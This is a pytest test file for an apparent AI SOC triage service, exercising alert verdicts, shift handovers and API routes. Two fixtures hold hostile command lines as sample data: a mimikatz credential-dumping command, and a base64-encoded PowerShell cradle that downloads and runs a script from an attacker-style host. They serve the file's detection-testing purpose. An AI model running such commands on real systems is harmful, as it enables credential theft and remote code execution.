"""Tests for CyberShield Enterprise - Autonomous AI SOC Analyst & Triager.
Verifies competing hypothesis evaluation, automated false-positive closure,
critical incident escalation, shift handover report synthesis, and REST API routes.
"""

import json
import pytest
from starlette.testclient import TestClient

from cybershield.api.server import app
from cybershield.copilot.schemas import (
    AnalystVerdict,
    ConfidenceLevel,
    AlertTriageRequest,
)
from cybershield.copilot.analyst import AutonomousSOCAnalyst


@pytest.fixture
def client():
    return TestClient(app)


@pytest.fixture
def analyst():
    return AutonomousSOCAnalyst()


# =========================================================================
# Unit Tests: Triage Reasoning & Hypothesis Evaluation
# =========================================================================

def test_triage_benign_administrative_activity_fp_close(analyst):
    # Alert triggered by routine SCCM software deployment
    req = AlertTriageRequest(
        alert_id="alt-sccm-001",
        title="PowerShell Script Execution from System Account",
        raw_event_payload={
            "comm": "powershell.exe",
            "parent_comm": "sccm_exec.exe",
            "cmdline": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\ccmcache\\update.ps1",
            "is_admin": True,
        },
        host_id="ws-workstation-44",
        user_id="NT AUTHORITY\\SYSTEM",
    )

    report = analyst.triage_alert(req)

    assert report.verdict == AnalystVerdict.FALSE_POSITIVE_CLOSE
    assert report.confidence == ConfidenceLevel.HIGH_DEFINITIVE
    assert report.risk_score <= 20.0
    assert report.recommended_soar_playbook is None
    assert len(report.evaluated_hypotheses) == 2

    # Hypothesis A (Benign) should be favored
    hyp_benign = [h for h in report.evaluated_hypotheses if h.hypothesis_id == "hyp-benign-admin"][0]
    assert hyp_benign.is_favored is True
    assert hyp_benign.likelihood_score > 0.0


def test_triage_credential_dumping_critical_escalation(analyst):
    # Alert triggered by mimikatz execution targeting LSASS
    req = AlertTriageRequest(
        alert_id="alt-mimi-002",
        title="Potential LSASS Memory Tampering Detected",
        raw_event_payload={
            "comm": "mimikatz.exe",
            "parent_comm": "cmd.exe",
            "cmdline": "mimikatz.exe sekurlsa::logonpasswords exit",
            "is_admin": False,
        },
        host_id="srv-dc-01",
        user_id="alice_temp",
        mitre_technique_hint="T1003.001 - OS Credential Dumping",
    )

    report = analyst.triage_alert(req)

    assert report.verdict == AnalystVerdict.CRITICAL_INCIDENT_ESCALATION
    assert report.confidence == ConfidenceLevel.HIGH_DEFINITIVE
    assert report.risk_score >= 90.0
    assert report.recommended_soar_playbook is not None
    assert "quarantine" in report.recommended_soar_playbook.lower()

    # Hypothesis B (Adversary) should be favored
    hyp_adv = [h for h in report.evaluated_hypotheses if h.hypothesis_id == "hyp-adversary-attack"][0]
    assert hyp_adv.is_favored is True


def test_triage_obfuscated_download_cradle(analyst):
    # Base64 encoded download cradle
    req = AlertTriageRequest(
        alert_id="alt-cradle-003",
        title="Obfuscated Script Cradle Execution",
        raw_event_payload={
            "comm": "powershell.exe",
            "parent_comm": "excel.exe",
            "cmdline": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL2F0dGFjay5pby9wYXlsb2FkLnBzMScp",
        },
        host_id="ws-finance-10",
        source_ip="198.51.100.200",
    )

    report = analyst.triage_alert(req)

    assert report.verdict == AnalystVerdict.CRITICAL_INCIDENT_ESCALATION
    assert report.risk_score >= 90.0


def test_triage_ambiguous_activity_monitoring(analyst):
    # Ambiguous command line without clear indicators
    req = AlertTriageRequest(
        alert_id="alt-ambig-004",
        title="Unusual Network Diagnostic Command",
        raw_event_payload={
            "comm": "ping.exe",
            "parent_comm": "cmd.exe",
            "cmdline": "ping -n 4 internal.corp",
        },
        host_id="ws-dev-01",
    )

    report = analyst.triage_alert(req)
    assert report.verdict == AnalystVerdict.SUSPICIOUS_MONITOR
    assert report.risk_score < 60.0


# =========================================================================
# Unit Tests: Shift Handover & Operational Metrics
# =========================================================================

def test_shift_handover_report_generation(analyst):
    # Triage a batch of benign and malicious alerts
    analyst.triage_alert(
        AlertTriageRequest(
            alert_id="a1",
            title="Ansible Scheduled Run",
            raw_event_payload={"parent_comm": "ansible-playbook"},
            host_id="h1",
        )
    )
    analyst.triage_alert(
        AlertTriageRequest(
            alert_id="a2",
            title="Mimikatz Execution",
            raw_event_payload={"cmdline": "mimikatz.exe sekurlsa"},
            host_id="h2",
        )
    )

    handover = analyst.generate_shift_handover("SHIFT-NIGHT-01", hours=8)
    assert handover.total_triaged == 2
    assert handover.false_positive_count == 1
    assert handover.escalated_count == 1
    assert "SHIFT-NIGHT-01" in handover.executive_narrative

    metrics = analyst.get_metrics()
    assert metrics.total_alerts_triaged == 2
    assert metrics.false_positives_closed == 1
    assert metrics.escalations_generated == 1
    assert metrics.auto_closure_rate == 0.5


# =========================================================================
# REST API Integration Tests
# =========================================================================

def test_api_copilot_lifecycle(client):
    # 1. Triage Single Alert
    req_payload = {
        "alert_id": "api-alt-01",
        "title": "Ansible Configuration Management Push",
        "raw_event_payload": {
            "comm": "python.exe",
            "parent_comm": "ansible_worker.exe",
            "cmdline": "ansible push config",
        },
        "host_id": "api-srv-infra",
    }
    resp = client.post("/api/v1/copilot/triage", json=req_payload)
    assert resp.status_code == 201
    rep = resp.json()
    assert rep["verdict"] == "FALSE_POSITIVE_CLOSE"
    rep_id = rep["report_id"]

    # 2. Retrieve Investigation Report
    resp = client.get(f"/api/v1/copilot/investigations/{rep_id}")
    assert resp.status_code == 200
    assert resp.json()["report_id"] == rep_id

    # 3. Batch Triage
    resp = client.post("/api/v1/copilot/batch-triage", json=[req_payload])
    assert resp.status_code == 200
    assert len(resp.json()) == 1

    # 4. Generate Shift Handover
    resp = client.get("/api/v1/copilot/handover?shift_id=API-SHIFT-01&hours=8")
    assert resp.status_code == 200
    assert resp.json()["shift_id"] == "API-SHIFT-01"

    # 5. Get Metrics
    resp = client.get("/api/v1/copilot/metrics")
    assert resp.status_code == 200
    assert resp.json()["total_alerts_triaged"] >= 2
